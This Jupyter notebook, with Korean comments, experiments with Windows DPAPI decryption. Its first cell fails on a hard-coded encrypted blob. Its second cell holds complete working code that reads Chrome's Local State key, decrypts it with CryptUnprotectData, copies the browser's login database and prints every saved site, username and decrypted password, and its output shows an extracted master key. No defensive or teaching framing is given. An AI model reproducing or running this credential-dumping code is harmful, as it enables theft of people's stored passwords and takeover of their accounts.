{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "ename": "error",
     "evalue": "(-2146893813, 'CryptUnprotectData', '키를 지정된 상태에서 사용하기에 부적합합니다.')",
     "output_type": "error",
     "traceback": [
      "\u001B[1;31m---------------------------------------------------------------------------\u001B[0m",
      "\u001B[1;31merror\u001B[0m                                     Traceback (most recent call last)",
      "Cell \u001B[1;32mIn[1], line 17\u001B[0m\n\u001B[0;32m      5\u001B[0m eData \u001B[38;5;241m=\u001B[39m \u001B[38;5;124mb\u001B[39m\u001B[38;5;124m'\u001B[39m\u001B[38;5;130;01m\\x01\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\xd0\u001B[39;00m\u001B[38;5;130;01m\\x8c\u001B[39;00m\u001B[38;5;130;01m\\x9d\u001B[39;00m\u001B[38;5;130;01m\\xdf\u001B[39;00m\u001B[38;5;130;01m\\x01\u001B[39;00m\u001B[38;5;130;01m\\x15\u001B[39;00m\u001B[38;5;130;01m\\xd1\u001B[39;00m\u001B[38;5;130;01m\\x11\u001B[39;00m\u001B[38;5;130;01m\\x8c\u001B[39;00m\u001B[38;5;124mz\u001B[39m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\xc0\u001B[39;00m\u001B[38;5;124mO\u001B[39m\u001B[38;5;130;01m\\xc2\u001B[39;00m\u001B[38;5;130;01m\\x97\u001B[39;00m\u001B[38;5;130;01m\\\u001B[39;00m\n\u001B[0;32m      6\u001B[0m \u001B[38;5;130;01m\\xeb\u001B[39;00m\u001B[38;5;130;01m\\x01\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\x01\u001B[39;00m\u001B[38;5;130;01m\\x90\u001B[39;00m\u001B[38;5;130;01m\\x01\u001B[39;00m\u001B[38;5;130;01m\\xe7\u001B[39;00m\u001B[38;5;130;01m\\xb1\u001B[39;00m\u001B[38;5;130;01m\\x06\u001B[39;00m\u001B[38;5;124m+G\u001B[39m\u001B[38;5;130;01m\\xb5\u001B[39;00m\u001B[38;5;130;01m\\xe9\u001B[39;00m\u001B[38;5;130;01m\\xba\u001B[39;00m\u001B[38;5;124m`l|\u001B[39m\u001B[38;5;130;01m\\xe1\u001B[39;00m\u001B[38;5;124m}\u001B[39m\u001B[38;5;130;01m\\x13\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\\u001B[39;00m\n\u001B[0;32m      7\u001B[0m \u001B[38;5;130;01m\\x18\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;124md\u001B[39m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;124me\u001B[39m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;124ms\u001B[39m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;124mc\u001B[39m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;124mr\u001B[39m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;124mi\u001B[39m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;124mp\u001B[39m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;124mt\u001B[39m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;124mi\u001B[39m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;124mo\u001B[39m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;124mn\u001B[39m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\x00\u001B[39;00m\u001B[38;5;130;01m\\x10\u001B[39;00m\u001B[38;5;124mf\u001B[39m\u001B[38;5;130;01m\\\u001B[39;00m\n\u001B[1;32m   (...)\u001B[0m\n\u001B[0;32m     13\u001B[0m \u001B[38;5;130;01m\\x83\u001B[39;00m\u001B[38;5;124m>\u001B[39m\u001B[38;5;130;01m\\x82\u001B[39;00m\u001B[38;5;130;01m\\x13\u001B[39;00m\u001B[38;5;124m`\u001B[39m\u001B[38;5;130;01m\\xc6\u001B[39;00m\u001B[38;5;124mi\u001B[39m\u001B[38;5;130;01m\\xac\u001B[39;00m\u001B[38;5;130;01m\\xb7\u001B[39;00m\u001B[38;5;130;01m\\xcf\u001B[39;00m\u001B[38;5;130;01m\\xfc\u001B[39;00m\u001B[38;5;130;01m\\xc0\u001B[39;00m\u001B[38;5;130;01m\\x19\u001B[39;00m\u001B[38;5;124m=)\u001B[39m\u001B[38;5;130;01m\\xab\u001B[39;00m\u001B[38;5;130;01m\\xf6\u001B[39;00m\u001B[38;5;124mP\u001B[39m\u001B[38;5;130;01m\\xaf\u001B[39;00m\u001B[38;5;130;01m\\x83\u001B[39;00m\u001B[38;5;130;01m\\x18\u001B[39;00m\u001B[38;5;124m4#g\u001B[39m\u001B[38;5;130;01m\\xe8\u001B[39;00m\u001B[38;5;130;01m\\x8d\u001B[39;00m\u001B[38;5;130;01m\\x93\u001B[39;00m\u001B[38;5;130;01m\\x89\u001B[39;00m\u001B[38;5;130;01m\\\u001B[39;00m\n\u001B[0;32m     14\u001B[0m \u001B[38;5;130;01m\\xd1\u001B[39;00m\u001B[38;5;124mB\u001B[39m\u001B[38;5;130;01m\\xc6\u001B[39;00m\u001B[38;5;130;01m\\x02\u001B[39;00m\u001B[38;5;130;01m\\x9b\u001B[39;00m\u001B[38;5;130;01m\\x9f\u001B[39;00m\u001B[38;5;124m.@b\u001B[39m\u001B[38;5;130;01m\\xfc\u001B[39;00m\u001B[38;5;130;01m\\xd7\u001B[39;00m\u001B[38;5;130;01m\\x8d\u001B[39;00m\u001B[38;5;124m'\u001B[39m\n\u001B[0;32m     15\u001B[0m \u001B[38;5;66;03m#CryptProtectData 시 암호화된 데이터\u001B[39;00m\n\u001B[1;32m---> 17\u001B[0m dData \u001B[38;5;241m=\u001B[39m \u001B[43mwin32crypt\u001B[49m\u001B[38;5;241;43m.\u001B[39;49m\u001B[43mCryptUnprotectData\u001B[49m\u001B[43m(\u001B[49m\u001B[43meData\u001B[49m\u001B[43m,\u001B[49m\u001B[43m \u001B[49m\u001B[38;5;28;43;01mNone\u001B[39;49;00m\u001B[43m,\u001B[49m\u001B[43m \u001B[49m\u001B[38;5;28;43;01mNone\u001B[39;49;00m\u001B[43m,\u001B[49m\u001B[43m \u001B[49m\u001B[43mpromptStruct\u001B[49m\u001B[43m,\u001B[49m\u001B[43m \u001B[49m\u001B[38;5;241;43m0\u001B[39;49m\u001B[43m)\u001B[49m\n\u001B[0;32m     18\u001B[0m \u001B[38;5;28mprint\u001B[39m(\u001B[38;5;124mf\u001B[39m\u001B[38;5;124m\"\u001B[39m\u001B[38;5;132;01m{\u001B[39;00mdData\u001B[38;5;132;01m}\u001B[39;00m\u001B[38;5;124m\"\u001B[39m)\n",
      "\u001B[1;31merror\u001B[0m: (-2146893813, 'CryptUnprotectData', '키를 지정된 상태에서 사용하기에 부적합합니다.')"
     ]
    }
   ],
   "source": [
    "import win32crypt\n",
    "\n",
    "promptStruct = (0x1, 0, \"hello\")\n",
    "\n",
    "eData = b'\\x01\\x00\\x00\\x00\\xd0\\x8c\\x9d\\xdf\\x01\\x15\\xd1\\x11\\x8cz\\x00\\xc0O\\xc2\\x97\\\n",
    "\\xeb\\x01\\x00\\x00\\x00\\x01\\x90\\x01\\xe7\\xb1\\x06+G\\xb5\\xe9\\xba`l|\\xe1}\\x13\\x00\\x00\\x00\\\n",
    "\\x18\\x00\\x00\\x00d\\x00e\\x00s\\x00c\\x00r\\x00i\\x00p\\x00t\\x00i\\x00o\\x00n\\x00\\x00\\x00\\x10f\\\n",
    "\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x07\\xceeu\\nZ\\xe8\\xc3e\\x1eW\\x10\\x7f\\xa14\\x8c\\xcc\\\n",
    "\\x87G\\x05UM\\xbb=\\xcal\\xb7\\xb2\\x17\\t\\x14S\\x00\\x00\\x00\\x00\\x0e\\x80\\x00\\x00\\x00\\x02\\x00\\\n",
    "\\x00 \\x00\\x00\\x00\\xdav\\xd2\\xa4\\xea\\xae\\xb6\\xa6\\xd9\\xaf\\x91Rbi\\xf7q\\x91\\xb3\\xa3\\x9d\\xeeS\\\n",
    "\\x99!\\xac8\\xbeoHw\\xfa_\\x10\\x00\\x00\\x008)7I\\xfb\\x96\\xbb\\xf6\\x94\\xdcJQ\\x90\\xaf\\x15\\x9b@\\\n",
    "\\x00\\x00\\x00\\xdc\\xebbD\\x80\\x0b\\x95\\xc3\\x13\\xd1\\xa8\\x8d\\x0fL~\\x17\\xf9\\xbf\\xc5dd\\x94@g\\\n",
    "\\x83>\\x82\\x13`\\xc6i\\xac\\xb7\\xcf\\xfc\\xc0\\x19=)\\xab\\xf6P\\xaf\\x83\\x184#g\\xe8\\x8d\\x93\\x89\\\n",
    "\\xd1B\\xc6\\x02\\x9b\\x9f.@b\\xfc\\xd7\\x8d'\n",
    "#CryptProtectData 시 암호화된 데이터\n",
    "\n",
    "dData = win32crypt.CryptUnprotectData(eData, None, None, promptStruct, 0)\n",
    "print(f\"{dData}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Master Key : b'\\xc7z\\xb2\\x1b\\xe3\\xa7d\\xb7H\\x04H\\xbc4T\\xa0p\\x10\\x98\\x97\\x9bP\\xe7\\x80^\\x1d\\xb3\\x94\\x99\\xa1\\xe9\\xb1\\x9d'\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import sqlite3\n",
    "import win32crypt\n",
    "import json\n",
    "import base64\n",
    "from Cryptodome.Cipher import AES\n",
    "import shutil\n",
    "\n",
    "def get_master_key():\n",
    "    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\Local State', \"r\",encoding='utf-8') as f:\n",
    "        local_state = f.read()\n",
    "        local_state = json.loads(local_state) #joson load\n",
    "    master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n",
    "    master_key = master_key[5:]  # removing DPAPI\n",
    "    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]\n",
    "\n",
    "    return master_key\n",
    "\n",
    "def decrypt_payload(cipher, payload):\n",
    "    return cipher.decrypt(payload)\n",
    "\n",
    "\n",
    "def generate_chipher(aes_key, iv):\n",
    "    return AES.new(aes_key, AES.MODE_GCM, iv)\n",
    "\n",
    "def decrypt_password(buff, master_key):\n",
    "    try:\n",
    "        iv = buff[3:15]\n",
    "        payload = buff[15:-16]\n",
    "        cipher = generate_chipher(master_key, iv)\n",
    "        decrypt_pass = decrypt_payload(cipher, payload)\n",
    "        decrypt_pass = decrypt_pass.decode('utf-8')  # remove suffix bytes.\n",
    "        return decrypt_pass\n",
    "    except Exception as e:\n",
    "        print(\"Probably saved password from Chrome version older than v80\\n\")\n",
    "        print(str(e))\n",
    "        return \"Chrome < 80\"\n",
    "\n",
    "\n",
    "master_key = get_master_key()\n",
    "print('[+] Master Key :',master_key)\n",
    "login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data For Account'\n",
    "shutil.copy2(login_db, \"Loginvault.db\") #making a temp copy since Login Data DB is locked while Chrome is running\n",
    "\n",
    "#connect to sqlite database\n",
    "conn = sqlite3.connect(\"Loginvault.db\")\n",
    "cursor = conn.cursor()\n",
    "\n",
    "\n",
    "try:\n",
    "    cursor.execute(\"SELECT origin_url, username_value, password_value FROM Logins\")\n",
    "    for index, login in enumerate(cursor.fetchall()):\n",
    "        url = login[0]\n",
    "        username = login[1]\n",
    "        ciphertext = login[2]\n",
    "        decrypted_password = decrypt_password(ciphertext, master_key)\n",
    "        if len(url) > 0:\n",
    "            print(\"URL: \" + url + \"\\nUser Name: \" + username + \"\\nPassword: \" + decrypted_password + \"\\n\" + \"*\" * 50 + \"\\n\")\n",
    "except Exception as e:\n",
    "    print(e)\n",
    "    pass\n",
    "\n",
    "cursor.close()\n",
    "conn.close()\n",
    "\n",
    "try:\n",
    "    os.remove(\"Loginvault.db\")\n",
    "\n",
    "except Exception as e:\n",
    "    print(e)\n",
    "    pass"
   ],
   "metadata": {
    "collapsed": false
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [],
   "metadata": {
    "collapsed": false
   }
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
